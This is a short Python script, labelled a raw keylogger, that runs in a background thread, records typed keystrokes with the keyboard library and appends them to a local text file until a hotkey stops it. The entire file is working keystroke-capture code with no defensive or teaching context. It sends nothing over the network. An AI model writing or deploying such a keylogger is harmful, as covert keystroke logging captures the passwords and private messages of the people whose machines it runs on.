#Raw keylogger in python
import keyboard as kb
from threading import Thread

#It will start recording the keystroke log after pressing enter
SHOULD_RECORD = True
def start_rec():
    while SHOULD_RECORD:
        rec=kb.record(until="enter")
        seq=kb.get_typed_strings(rec)
        if (SHOULD_RECORD==True):
            with open("saved_keyboard.txt", "a") as f:  #The name of the file to be saved
                f.write("".join(seq) + "///") #Separate words with slashes
        else:
            break

#Registration will stop after pressing the hotkey and enter button
def stop_rec():
    global SHOULD_RECORD
    SHOULD_RECORD = False
start_thread = Thread(target=start_rec)
start_thread.start()

kb.add_hotkey('ctrl+shift+a',stop_rec)
exit()